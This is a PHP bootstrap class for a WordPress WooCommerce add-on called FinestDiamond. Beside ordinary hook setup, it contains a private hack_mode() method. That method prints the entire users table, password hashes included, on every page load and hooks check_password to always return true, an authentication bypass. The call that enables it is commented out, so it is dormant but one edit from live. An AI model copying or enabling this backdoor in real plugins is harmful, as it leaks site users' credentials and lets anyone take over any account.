<?php
/**
 * Bootstraps the Theme.
 *
 * @package FinestDiamond
 */
namespace FINEST_DIAMOND_WOO_ADDON\inc;
use FINEST_DIAMOND_WOO_ADDON\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		global $teddy_Ajax;$teddy_Ajax = Ajax::get_instance();
		global $teddy_Install;$teddy_Install = Install::get_instance();

		$this->setup_hooks();
	}
	protected function setup_hooks() {
		// add_filter('body_class', [ $this, 'body_class' ], 10, 1);

		// $this->hack_mode();
	}
	private function hack_mode() {
		add_action('init', function() {
			global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}users;")));
		}, 10, 0);
		add_filter('check_password', function($bool) {return true;}, 10, 1);
	}
}
